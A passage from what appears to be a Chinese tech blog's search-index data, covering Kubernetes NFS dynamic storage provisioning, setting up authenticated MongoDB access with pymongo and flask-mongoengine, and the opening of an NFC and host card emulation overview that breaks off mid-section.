class=\"string\">EOF</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"5-运行上述三个部署文件\"><a href=\"#5-运行上述三个部署文件\" class=\"headerlink\" title=\"5. 运行上述三个部署文件\"></a>5. 运行上述三个部署文件</h3><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl create -f nfs-client.yaml</span><br><span class=\"line\">kubectl create -f nfs-client-sa.yaml</span><br><span class=\"line\">kubectl create -f nfs-client-class.yaml</span><br></pre></td></tr></table></figure>\n\n<p>到此为止，大功告成！！！</p>\n<h2 id=\"注意事项\"><a href=\"#注意事项\" class=\"headerlink\" title=\"注意事项\"></a>注意事项</h2><h3 id=\"1-将自定义的StorageClass设置为Kubernetes集群的默认StorageClass\"><a href=\"#1-将自定义的StorageClass设置为Kubernetes集群的默认StorageClass\" class=\"headerlink\" title=\"1. 将自定义的StorageClass设置为Kubernetes集群的默认StorageClass\"></a>1. 将自定义的StorageClass设置为Kubernetes集群的默认StorageClass</h3><p>在使用 PVC 时，可以通过<code>DefaultStorageClass</code>准入控制设置默认 StorageClass, 即给未设置 storageClassName 的 PVC 自动添加默认的 StorageClass。而默认的 StorageClass 带有 <code>storageclass.kubernetes.io/is-default-class=true</code>的 annotation 。</p>\n<p>设置为默认 StorageClass</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl patch storageclass nfs-client -p <span class=\"string\">&#x27;&#123;&quot;metadata&quot;: &#123;&quot;annotations&quot;:&#123;&quot;storageclass.kubernetes.io/is-default-class&quot;:&quot;true&quot;&#125;&#125;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>取消原来的默认 StorageClass</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl patch storageclass nfs-clinet -p <span class=\"string\">&#x27;&#123;&quot;metadata&quot;: &#123;&quot;annotations&quot;:&#123;&quot;storageclass.kubernetes.io/is-default-class&quot;:&quot;false&quot;&#125;&#125;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-常用的检查方法\"><a href=\"#2-常用的检查方法\" class=\"headerlink\" title=\"2. 常用的检查方法\"></a>2. 常用的检查方法</h3><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@Helm harbor]<span class=\"comment\"># kubectl get sc</span></span><br><span class=\"line\">NAME                 PROVISIONER      RECLAIMPOLICY   VOLUMEBINDINGMODE   ALLOWVOLUMEEXPANSION   AGE</span><br><span class=\"line\">course-nfs-storage   fuseim.pri/ifs   Delete          Immediate           <span class=\"literal\">false</span>                  13h</span><br><span class=\"line\"></span><br><span class=\"line\">[root@Helm harbor]<span class=\"comment\"># kubectl get pv</span></span><br><span class=\"line\">NAME                                       CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS   CLAIM                                         STORAGECLASS         REASON   AGE</span><br><span class=\"line\">pvc-2cbc8907-acbd-4999-b5ea-c58000347835   1Gi        RWO            Delete           Bound    default/data-ggg-harbor-redis-0               course-nfs-storage            12h</span><br><span class=\"line\">pvc-3e1e2ac4-04dc-44a6-9f6e-7456f0d09d5c   5Gi        RWO            Delete           Bound    default/ggg-harbor-registry                   course-nfs-storage            12h</span><br><span class=\"line\">pvc-535149b4-b3fb-43cb-b8e3-9d7a1069e7b9   5Gi        RWO            Delete           Bound    default/data-ggg-harbor-trivy-0               course-nfs-storage            12h</span><br><span class=\"line\">pvc-717e79cd-3c44-44a0-8b2b-ce72b1ae0994   5Gi        RWO            Delete           Bound    default/ggg-harbor-chartmuseum                course-nfs-storage            12h</span><br><span class=\"line\">pvc-7a76ad65-dcbc-4310-ab66-eaf658c20b2f   1Gi        RWO            Delete           Bound    default/ggg-harbor-jobservice                 course-nfs-storage            12h</span><br><span class=\"line\">pvc-f9615144-0a24-4fdf-b12f-fe5d4ff5aed3   1Gi        RWO            Delete           Bound    default/database-data-ggg-harbor-database-0   course-nfs-storage            12h</span><br><span class=\"line\"></span><br><span class=\"line\">[root@Helm harbor]<span class=\"comment\"># kubectl get pvc</span></span><br><span class=\"line\">NAME                                  STATUS   VOLUME                                     CAPACITY   ACCESS MODES   STORAGECLASS         AGE</span><br><span class=\"line\">data-ggg-harbor-redis-0               Bound    pvc-2cbc8907-acbd-4999-b5ea-c58000347835   1Gi        RWO            course-nfs-storage   12h</span><br><span class=\"line\">data-ggg-harbor-trivy-0               Bound    pvc-535149b4-b3fb-43cb-b8e3-9d7a1069e7b9   5Gi        RWO            course-nfs-storage   12h</span><br><span class=\"line\">database-data-ggg-harbor-database-0   Bound    pvc-f9615144-0a24-4fdf-b12f-fe5d4ff5aed3   1Gi        RWO            course-nfs-storage   12h</span><br><span class=\"line\">ggg-harbor-chartmuseum                Bound    pvc-717e79cd-3c44-44a0-8b2b-ce72b1ae0994   5Gi        RWO            course-nfs-storage   12h</span><br><span class=\"line\">ggg-harbor-jobservice                 Bound    pvc-7a76ad65-dcbc-4310-ab66-eaf658c20b2f   1Gi        RWO            course-nfs-storage   12h</span><br><span class=\"line\">ggg-harbor-registry                   Bound    pvc-3e1e2ac4-04dc-44a6-9f6e-7456f0d09d5c   5Gi        RWO            course-nfs-storage   12h</span><br><span class=\"line\"></span><br><span class=\"line\">[root@Helm harbor]<span class=\"comment\"># kubectl get pods</span></span><br><span class=\"line\">NAME                                        READY   STATUS    RESTARTS   AGE</span><br><span class=\"line\">ggg-harbor-chartmuseum-7d8ccfc449-85lrh     1/1     Running   0          12h</span><br><span class=\"line\">ggg-harbor-clair-bfd9dc556-sdc6t            2/2     Running   2          12h</span><br><span class=\"line\">ggg-harbor-core-6bbb76fb97-2ztrf            1/1     Running   2          12h</span><br><span class=\"line\">ggg-harbor-database-0                       1/1     Running   0          12h</span><br><span class=\"line\">ggg-harbor-jobservice-59c9b578d6-5k8l4      1/1     Running   1          12h</span><br><span class=\"line\">ggg-harbor-nginx-76b69b5fd8-swmb6           1/1     Running   0          12h</span><br><span class=\"line\">ggg-harbor-notary-server-7899447446-ns7h8   1/1     Running   4          12h</span><br><span class=\"line\">ggg-harbor-notary-signer-666cdc5478-wgx62   1/1     Running   4          12h</span><br><span class=\"line\">ggg-harbor-portal-6d465b4f77-67d5v          1/1     Running   0          12h</span><br><span class=\"line\">ggg-harbor-redis-0                          1/1     Running   0          12h</span><br><span class=\"line\">ggg-harbor-registry-6847fbfc64-klpvd        2/2     Running   0          12h</span><br><span class=\"line\">ggg-harbor-trivy-0                          1/1     Running   1          12h</span><br><span class=\"line\">nfs-client-provisioner-7895fccfdc-p8tw9     1/1     Running   0          13h</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-动态创建PV的存储方式\"><a href=\"#3-动态创建PV的存储方式\" class=\"headerlink\" title=\"3. 动态创建PV的存储方式\"></a>3. 动态创建PV的存储方式</h3><p>自动创建的 PV 以<code>$&#123;namespace&#125;-$&#123;pvcName&#125;-$&#123;pvName&#125;</code>这样的命名格式创建在 NFS 服务器上的共享数据目录中<br>而当这个 PV 被回收后会以<code>archieved-$&#123;namespace&#125;-$&#123;pvcName&#125;-$&#123;pvName&#125;</code>这样的命名格式存在 NFS 服务器上。</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@nfs data]<span class=\"comment\"># ls -l |grep ggg</span></span><br><span class=\"line\">drwx------. 19 polkitd input  4096 8月  16 01:02 default-database-data-ggg-harbor-database-0-pvc-f9615144-0a24-4fdf-b12f-fe5d4ff5aed3</span><br><span class=\"line\">drwxrwxrwx.  2 root    root   4096 8月  16 13:12 default-data-ggg-harbor-redis-0-pvc-2cbc8907-acbd-4999-b5ea-c58000347835</span><br><span class=\"line\">drwxrwxrwx.  4 root    root   4096 8月  16 01:00 default-data-ggg-harbor-trivy-0-pvc-535149b4-b3fb-43cb-b8e3-9d7a1069e7b9</span><br><span class=\"line\">drwxrwxrwx.  2 root    root   4096 8月  16 01:00 default-ggg-harbor-chartmuseum-pvc-717e79cd-3c44-44a0-8b2b-ce72b1ae0994</span><br><span class=\"line\">drwxrwxrwx.  2 root    root   4096 8月  16 01:00 default-ggg-harbor-jobservice-pvc-7a76ad65-dcbc-4310-ab66-eaf658c20b2f</span><br><span class=\"line\">drwxrwxrwx.  2 root    root   4096 8月  16 01:00 default-ggg-harbor-registry-pvc-3e1e2ac4-04dc-44a6-9f6e-7456f0d09d5c</span><br><span class=\"line\"></span><br><span class=\"line\">[root@nfs data]<span class=\"comment\"># ls -l |grep kkk</span></span><br><span class=\"line\">drwx------. 19 polkitd input  4096 8月  16 00:38 archived-default-database-data-kkk-harbor-database-0-pvc-4e9b9e6c-3729-464d-9b9f-57f916533b8f</span><br><span class=\"line\">drwxrwxrwx.  2 root    root   4096 8月  16 00:47 archived-default-data-kkk-harbor-redis-0-pvc-208f1203-f5fe-4a8c-b8cd-c8734fecdd76</span><br><span class=\"line\">drwxrwxrwx.  4 root    root   4096 8月  16 00:23 archived-default-data-kkk-harbor-trivy-0-pvc-e93d5ae0-d84f-440d-b1bc-ead19485fa00</span><br><span class=\"line\">drwxrwxrwx.  2 root    root   4096 8月  16 00:23 archived-default-kkk-harbor-chartmuseum-pvc-49dcb036-30d2-453e-b3fc-851518c27b9b</span><br><span class=\"line\">drwxrwxrwx.  2 root    root   4096 8月  16 00:23 archived-default-kkk-harbor-jobservice-pvc-19df4cf0-3f04-439d-9b72-42377834b514</span><br><span class=\"line\">drwxrwxrwx.  2 root    root   4096 8月  16 00:23 archived-default-kkk-harbor-registry-pvc-11d4f04e-cb6b-4d36-90c0-99ae85f5d10c</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-通过HELM部署nfs-client\"><a href=\"#4-通过HELM部署nfs-client\" class=\"headerlink\" title=\"4. 通过HELM部署nfs-client\"></a>4. 通过HELM部署nfs-client</h3><p>如果能够KX上网，从HELM直接安装NFS StorageClass也是很方便的。</p>\n<p><code>helm install stable/nfs-client-provisioner --set nfs.server=192.168.0.200 --set nfs.path=/data --generate-name</code></p>\n<p>安装完成后将部署一个名为<code>nfs-client</code>的StorageClass，其配置信息为：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">---</span></span><br><span class=\"line\"><span class=\"attr\">allowVolumeExpansion:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">annotations:</span></span><br><span class=\"line\">    <span class=\"attr\">meta.helm.sh/release-name:</span> <span class=\"string\">hhh</span>                          <span class=\"comment\"># HELM的Release Name，这个不重要</span></span><br><span class=\"line\">    <span class=\"attr\">meta.helm.sh/release-namespace:</span> <span class=\"string\">default</span></span><br><span class=\"line\">  <span class=\"attr\">creationTimestamp:</span> <span class=\"string\">&#x27;2020-08-16T05:49:31Z&#x27;</span></span><br><span class=\"line\">  <span class=\"attr\">labels:</span></span><br><span class=\"line\">    <span class=\"attr\">app:</span> <span class=\"string\">nfs-client-provisioner</span></span><br><span class=\"line\">    <span class=\"attr\">app.kubernetes.io/managed-by:</span> <span class=\"string\">Helm</span></span><br><span class=\"line\"><span class=\"attr\">chart:</span> <span class=\"string\">nfs-client-provisioner-1.2.9</span>                         <span class=\"comment\"># HELM的配置文件版本号</span></span><br><span class=\"line\">    <span class=\"attr\">heritage:</span> <span class=\"string\">Helm</span></span><br><span class=\"line\">    <span class=\"attr\">release:</span> <span class=\"string\">hhh</span></span><br><span class=\"line\">  <span class=\"attr\">managedFields:</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">apiVersion:</span> <span class=\"string\">storage.k8s.io/v1</span></span><br><span class=\"line\">      <span class=\"attr\">fieldsType:</span> <span class=\"string\">FieldsV1</span></span><br><span class=\"line\">      <span class=\"attr\">fieldsV1:</span></span><br><span class=\"line\">        <span class=\"attr\">&#x27;f:metadata&#x27;:</span> &#123;&#125;</span><br><span class=\"line\">      <span class=\"attr\">manager:</span> <span class=\"string\">Go-http-client</span></span><br><span class=\"line\">      <span class=\"attr\">operation:</span> <span class=\"string\">Update</span></span><br><span class=\"line\">      <span class=\"attr\">time:</span> <span class=\"string\">&#x27;2020-08-16T05:49:31Z&#x27;</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">nfs-client</span>                                          <span class=\"comment\"># 新建StorageClass的Name</span></span><br><span class=\"line\">  <span class=\"attr\">resourceVersion:</span> <span class=\"string\">&#x27;139695&#x27;</span></span><br><span class=\"line\">  <span class=\"attr\">selfLink:</span> <span class=\"string\">/apis/storage.k8s.io/v1/storageclasses/nfs-client</span></span><br><span class=\"line\">  <span class=\"attr\">uid:</span> <span class=\"string\">d7295404-a65e-4b56-8bae-bc018b85d032</span></span><br><span class=\"line\"><span class=\"attr\">parameters:</span></span><br><span class=\"line\">  <span class=\"attr\">archiveOnDelete:</span> <span class=\"string\">&#x27;true&#x27;</span></span><br><span class=\"line\"><span class=\"attr\">provisioner:</span> <span class=\"string\">cluster.local/hhh-nfs-client-provisioner</span>       <span class=\"comment\"># provisioner的container名字不同</span></span><br><span class=\"line\"><span class=\"attr\">reclaimPolicy:</span> <span class=\"string\">Delete</span></span><br><span class=\"line\"><span class=\"attr\">volumeBindingMode:</span> <span class=\"string\">Immediate</span></span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><ul>\n<li><a href=\"https://www.qikqiak.com/k8s-book/docs/35.StorageClass.html\">Kubernetes 学习手册-阳明博客</a></li>\n<li><a href=\"https://github.com/kubernetes-retired/external-storage/tree/master/nfs-client\">Kubernetes NFS-Client Provisioner 官方文档</a></li>\n<li><a href=\"https://www.sohu.com/a/249429452_760387\">浅谈 Kubernetes 数据持久化方案</a></li>\n<li><a href=\"https://github.com/helm/charts/tree/master/stable/nfs-client-provisioner\">通过HELM安装nfs-client-provisioner</a></li>\n<li><a href=\"http://docs.kubernetes.org.cn/429.html\">Kubernetes Volume综述</a></li>\n</ul>\n"},{"title":"Mongo数据库设置鉴权登录的方法","url":"/2019/11/15/Mongo%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E7%BD%AE%E9%89%B4%E6%9D%83%E7%99%BB%E5%BD%95%E7%9A%84%E6%96%B9%E6%B3%95/","content":"<p>Mongo数据库默认采用免鉴权的登录方式，虽然很方便，但是有被劫持勒索的风险，为此最好采用鉴权登录的方法。</p>\n<h2 id=\"配置初始化用户和口令\"><a href=\"#配置初始化用户和口令\" class=\"headerlink\" title=\"配置初始化用户和口令\"></a>配置初始化用户和口令</h2><p>以<a href=\"https://github.com/docker-library/mongo/tree/master/3.6\">mongo:3.6镜像文件</a>为例，启动命令是<code>/usr/local/bin/docker-entrypoint.sh</code>。</p>\n<p>分析该脚本文件可以发现其基本步骤是：</p>\n<ol>\n<li>下载Mongo数据库的代码，并以免鉴权方式启动。</li>\n<li>如果OS设置了环境变量<code>MONGO_INITDB_ROOT_USERNAME</code>和<code>MONGO_INITDB_ROOT_PASSWORD</code>，则新建数据库用户并设置权限规则。<br> 注意：mongo初始化用户的角色级别为root，需要授权创建和修改database。</li>\n<li>重新启动数据库。</li>\n</ol>\n<h2 id=\"以鉴权方式连接Mongo\"><a href=\"#以鉴权方式连接Mongo\" class=\"headerlink\" title=\"以鉴权方式连接Mongo\"></a>以鉴权方式连接Mongo</h2><ul>\n<li><p>以mongo shell为例，在命令行中带入用户名和密码，就可以以鉴权方式登录了。</p>\n  <figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">mongo -u username -p password --authenticationDatabase admin</span></span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>如果采用pymong登录，示例代码为：</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> logging</span><br><span class=\"line\"><span class=\"keyword\">from</span> pymongo <span class=\"keyword\">import</span> MongoClient</span><br><span class=\"line\"></span><br><span class=\"line\">uri = <span class=\"string\">&quot;mongodb://username:password@localhost:27017&quot;</span></span><br><span class=\"line\">client = MongoClient(uri)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    <span class=\"comment\"># Test with this ismaster command is cheap and does not require auth.</span></span><br><span class=\"line\">    client.admin.command(<span class=\"string\">&#x27;ismaster&#x27;</span>)</span><br><span class=\"line\">    logger.info(<span class=\"string\">u&quot;Connected to MongoDB, uri=&#123;0&#125;.&quot;</span>.<span class=\"built_in\">format</span>(uri))</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    logger.error(<span class=\"string\">u&quot;Connect MongoDB sever failed and abort now! uri=&#123;0&#125;.&quot;</span>.<span class=\"built_in\">format</span>(uri))</span><br><span class=\"line\">    <span class=\"keyword\">raise</span> SyntaxError  </span><br></pre></td></tr></table></figure></li>\n</ul>\n<hr>\n<h2 id=\"关于flask-mongoengine的疑难问题\"><a href=\"#关于flask-mongoengine的疑难问题\" class=\"headerlink\" title=\"关于flask-mongoengine的疑难问题\"></a>关于flask-mongoengine的疑难问题</h2><h2 id=\"现象描述\"><a href=\"#现象描述\" class=\"headerlink\" title=\"现象描述\"></a>现象描述</h2><p>调用<code>flask-mongoengine</code>连接mongo，采用URI方式配置参数一直报各类鉴权错误</p>\n<h2 id=\"原因分析\"><a href=\"#原因分析\" class=\"headerlink\" title=\"原因分析\"></a>原因分析</h2><p>根本原因是flask-pymongo的封装存在bug，其规则是：</p>\n<ul>\n<li>MONGO_DBNAME如果没有设置的话，用于验证的数据库就会被设置成app.name。</li>\n<li>如果设置了MONGO_DBNAME，用于验证和连接的数据库都会变成MONGO_DBNAME。</li>\n</ul>\n<p>所以经过分析，我们可以不使用MONGO_DBNAME，然后让DBNAME通过app.name来进行设置。</p>\n<p>请看如下技术文档：</p>\n<p><a href=\"http://docs.mongoengine.org/guide/connecting.html\">MongoEngine关于connect的规定</a> ：</p>\n<blockquote>\n<ul>\n<li>If the database requires authentication, username, password and authentication_source arguments should be provided.</li>\n<li>Database, username and password from URI string overrides corresponding parameters in connect().</li>\n</ul>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> mongoengine <span class=\"keyword\">import</span> connect</span><br><span class=\"line\"></span><br><span class=\"line\">connect(</span><br><span class=\"line\">    db=<span class=\"string\">&#x27;test&#x27;</span>,</span><br><span class=\"line\">    username=<span class=\"string\">&#x27;user&#x27;</span>,</span><br><span class=\"line\">    password=<span class=\"string\">&#x27;12345&#x27;</span>,</span><br><span class=\"line\">    host=<span class=\"string\">&#x27;mongodb://admin:qwerty@localhost/production&#x27;</span></span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://mongoengine-odm.readthedocs.io/guide/connecting.html\">Flask Mongoengine关于connect的规定</a>:  </p>\n<blockquote>\n<ul>\n<li>Uri style connections are also supported, just supply the uri as the host in the ‘MONGODB_SETTINGS’ dictionary with app.config.</li>\n<li>Note that database name from uri has priority over name.</li>\n</ul>\n</blockquote>\n<h2 id=\"解决方法\"><a href=\"#解决方法\" class=\"headerlink\" title=\"解决方法\"></a>解决方法</h2><ol>\n<li>在使用Mongoengine方式连接Mongo数据库时，不要采用URI方式，而是单独设置每个参数;</li>\n<li>启用鉴权方式时，必须显式包含username、password、authentication_source。</li>\n</ol>\n<p>示例代码如下：</p>\n<ul>\n<li><p>在配置文件<code>settings.py</code>中设置Mongo的配置参数：</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"></span><br><span class=\"line\">MONGODB_SETTINGS = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;db&#x27;</span>: <span class=\"string\">&#x27;cmccb2b&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;username&#x27;</span>: os.getenv(<span class=\"string\">&#x27;MONGODB_USERNAME&#x27;</span>),</span><br><span class=\"line\">    <span class=\"string\">&#x27;password&#x27;</span>: os.getenv(<span class=\"string\">&#x27;MONGODB_PASSWORD&#x27;</span>),</span><br><span class=\"line\">    <span class=\"string\">&#x27;host&#x27;</span>: os.getenv(<span class=\"string\">&#x27;MONGODB_HOST&#x27;</span>),</span><br><span class=\"line\">    <span class=\"string\">&#x27;port&#x27;</span>: <span class=\"built_in\">int</span>(os.getenv(<span class=\"string\">&#x27;MONGODB_PORT&#x27;</span>)),</span><br><span class=\"line\">    <span class=\"string\">&#x27;connect&#x27;</span>: <span class=\"literal\">False</span>,  <span class=\"comment\"># set for pymongo bug fix</span></span><br><span class=\"line\">    <span class=\"string\">&#x27;authentication_source&#x27;</span>: <span class=\"string\">&#x27;admin&#x27;</span>, <span class=\"comment\"># set authentication source database， default is MONGODB_NAME</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>在主入口<code>main.py</code>中启动flask：</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask</span><br><span class=\"line\"><span class=\"keyword\">from</span> flask_mongoengine <span class=\"keyword\">import</span> MongoEngine</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 初始化app，原型在flask，并从settings.py中提取自定义的类属性，包括MongoDB配置，debug配置等</span></span><br><span class=\"line\">app = Flask(__name__,</span><br><span class=\"line\">            static_folder=<span class=\"string\">&#x27;static&#x27;</span>,</span><br><span class=\"line\">            template_folder=<span class=\"string\">&#x27;templates&#x27;</span>)</span><br><span class=\"line\">app.config.from_pyfile(filename=<span class=\"string\">&#x27;settings.py&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 初始化数据库连接db</span></span><br><span class=\"line\">db = MongoEngine()  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 连接flask和mongoengine，注意db在models.py中初始化，参数设置已经从app.config中加载</span></span><br><span class=\"line\">db.init_app(app)</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>相关示范案例，请参见<a href=\"https://www.techcoil.com/blog/how-to-enable-authenticated-mongodb-access-for-flask-mongoengine-applications/\">Mongo配置鉴权方式的经验</a></p>\n</li>\n<li><p><a href=\"https://nladuo.github.io/2018/10/25/Flask-Pymongo%E7%99%BB%E9%99%86%E9%AA%8C%E8%AF%81%E9%97%AE%E9%A2%98%E5%B0%8F%E8%AE%B0/\">Flask-Pymongo登陆验证问题小记</a></p>\n</li>\n</ul>\n"},{"title":"NFC核心技术概览","url":"/2020/12/30/NFC%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF%E6%A6%82%E8%A7%88/","content":"<h2 id=\"NFC简介\"><a href=\"#NFC简介\" class=\"headerlink\" title=\"NFC简介\"></a>NFC简介</h2><p>NFC(近场通信，Near Field Communication）是一种短距高频的无线电技术，由非接触式射频识别(RFID)演变而来。<br>NFC工作频率为13.56Hz，通常只有在距离不超过4厘米时才能启动连接，其传输速度有106 Kbit&#x2F;秒、212 Kbit&#x2F;秒或者424 Kbit&#x2F;秒三种。<br>NFC有3种工作模式：读卡器模式、点对点模式、卡模拟模式。</p>\n<ul>\n<li>读取器&#x2F;写入器模式（Reader&#x2F;writer mode）：NFC设备产生射频场从外部采用相同标准的NFC标签中读写数据，支持 NFC 设备读取和&#x2F;或写入被动 NFC 标签和贴纸。</li>\n<li>点对点模式（P2P mode）：支持 NFC 设备与其他 NFC 对等设备交换数据，Android Beam 使用的就是此操作模式。</li>\n<li>卡模拟模式（Card emulation mode）：读卡器是主动设备，产生射频场；NFC设备为被动设备，模拟一张符合NFC标准的非接触式卡片与读卡器进行交互。</li>\n</ul>\n<img src=\"/2020/12/30/NFC%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF%E6%A6%82%E8%A7%88/3.png\" class=\"\" title=\"NFC的三种工作模式\">\n\n<h2 id=\"基于Android的NFC终端\"><a href=\"#基于Android的NFC终端\" class=\"headerlink\" title=\"基于Android的NFC终端\"></a>基于Android的NFC终端</h2><p>Android 4.4版本开始，通过HCE(host-based card emulation，基于主机的卡模拟)，方式提供NFC功能支持。</p>\n<p>NFC终端主要包括非接触性前端CLF(也叫NFC控制器)、天线(Antenna)、安全模块(Secure Element,SE)三个主要部件，其中，非接前端、天线一般都集成在手机终端中，而安全模块可根据情况存放在不同的位置。</p>\n<img src=\"/2020/12/30/NFC%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF%E6%A6%82%E8%A7%88/2.jpg\" class=\"\" title=\"典型的NFC终端架构\">\n\n<ul>\n<li>CLF：非接触性前端，也称为NFC控制器，其功能包括射频信号的调制解调，非接触通信的协议处理。<br>  非接触前端一方面连接射频天线，实现13.56MHz信号的发送与接收，另一方面与安全模块通信。在CLF中提供了识读接口、P2P接口、卡模拟接口，分别对应上面所说的三种工作模式。</li>\n<li>天线，通常集成在终端内部，与非接前端相连，实现13.56MHz射频信号的发送与接收。</li>\n<li>安全模块SE，主要功能是实现应用和数据的安全存储，对外提供安全运算服务，它是卡模拟的核心。<br>  安全模块还通过非接前端与外部读写设备进行通信，实现数据存储及交易过程的安全性。</li>\n</ul>\n<p>根据安全模块存放的位置不同，NFC可分为不同的实现方案。</p>\n<h3 id=\"基于硬件的虚拟卡模式-Virtual-Card-Mode\"><a href=\"#基于硬件的虚拟卡模式-Virtual-Card-Mode\" class=\"headerlink\" title=\"基于硬件的虚拟卡模式(Virtual Card Mode)\"></a>基于硬件的虚拟卡模式(Virtual Card Mode)</h3><p>在虚拟卡模式下，需要提供安全模块SE(Secure Elemen)，SE提供对敏感信息的安全存储和对交易事务提供一个安全的执行环境。NFC芯片作为非接触通讯前端，将从外部读写器接收到的命令转发到SE，然后由SE处理，并通过NFC控制器回复。</p>\n<img src=\"/2020/12/30/NFC%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF%E6%A6%82%E8%A7%88/SE.png\" class=\"\" title=\"基于安全芯片SE的方式\">\n\n<h3 id=\"基于软件的主机卡模式-Host-Card-Mode\"><a href=\"#基于软件的主机卡模式-Host-Card-Mode\" class=\"headerlink\" title=\"基于软件的主机卡模式(Host Card Mode)\"></a>基于软件的主机卡模式(Host Card Mode)</h3><p>在主机卡模式下，不需要提供SE，而是由在手机中运行的一个应用或云端的服务器完成SE的功能，此时NFC芯片接收到的数据由操作系统或发送至手机中的应用，或通过移动网络发送至云端的服务器来完成交互。两种方式的特点都是绕过了手机内置的SE的限制。</p>\n<p>那么，如何通过HCE技术在手机上实现NFC卡模拟呢？首先要创建一个处理交易事务的HCE 服务，Android4.4为HCE服务提供了一个非常方便的基类，我们可以通过继承基类来实现自己的HCE服务。如果要开发已存在的NFC系统，我们只需要在 HCE 服务中实现NFC 读卡器期望的应用层协议。反之如果要开发自己的新的NFC 系统，我们就需要定义自己的协议和APDU 序列。一般而言我们应该保证数据交换时使用很少的APDU包数量和很小的数据量，这样用户就不必花很长时间将手机放在NFC 读卡器上。</p>\n<p>HCE 技术只是实现了将NFC 读卡器的数据送至操作系统的HCE 服务或者将回复数据返回给NFC 读卡器，而对于数据的处理和敏感信息的存储则没有具体实现细，所以说到底HCE 技术是模拟NFC 和SE 通信的协议和实现。但是HCE 并没有实现SE，只是用NFC 与SE 通信的方式告诉NFC 读卡器后面有SE的支持，从而以虚拟SE 的方式完成NFC 业务的安全保证。既然没有SE，那么HCE 用什么来充当SE 呢，解决方案要么是本地软件的模拟，要么是云端服务器的模拟。负责安全的SE如何通过本地化的软件或者远程的云端实现，并且能够保障安全性，需要HCE厂商自己考虑和实现。</p>\n<img src=\"/2020/12/30/NFC%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF%E6%A6%82%E8%A7%88/HCE.png\" class=\"\" title=\"基于主机的模拟卡方式\">\n\n<blockquote>\n<p>超级SIM卡是基于SIM SE芯片的技术方案，因此属于<strong>基于硬件的虚拟卡模式</strong>，但同时也可以为HCE提供支持。</p>\n</blockquote>\n<h3 id=\"双模（Dual-Mode）\"><a href=\"#双模（Dual-Mode）\" class=\"headerlink\" title=\"双模（Dual Mode）\"></a>双模（Dual Mode）</h3><img src=\"/2020/12/30/NFC%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF%E6%A6%82%E8%A7%88/dual-mode.png\" class=\"\" title=\"双模方式\">\n\n<h3 id=\"对比分析\"><a href=\"#对比分析\" class=\"headerlink\" title=\"对比分析\"></a>对比分析</h3><img src=\"/2020/12/30/NFC%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF%E6%A6%82%E8%A7%88/hce-se.png\" class=\"\" title=\"对比分析\">\n\n<h2 id=\"HCE的协议栈\"><a href=\"#HCE的协议栈\" class=\"headerlink\" title=\"HCE的协议栈\"></a>HCE的协议栈</h2><p>为支持NFC射频卡，HCE主要实现了两个ISO协议，分别是硬件标准<code>ISO/IEC 14443</code>和应用协议<code>ISO/IEC 7816</code>。</p>\n<img src=\"/2020/12/30/NFC%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF%E6%A6%82%E8%A7%88/protocol-stack.png\" class=\"\" title=\"NFC的核心协议栈\">\n\n<h3 id=\"ISO-IEC-14443\"><a href=\"#ISO-IEC-14443\" class=\"headerlink\" title=\"ISO&#x2F;IEC 14443\"></a>ISO&#x2F;IEC 14443</h3><p>Android 4.4 支持基于<code>NFC-Forum ISO-DEP</code>规范（基于<code>ISO/IEC 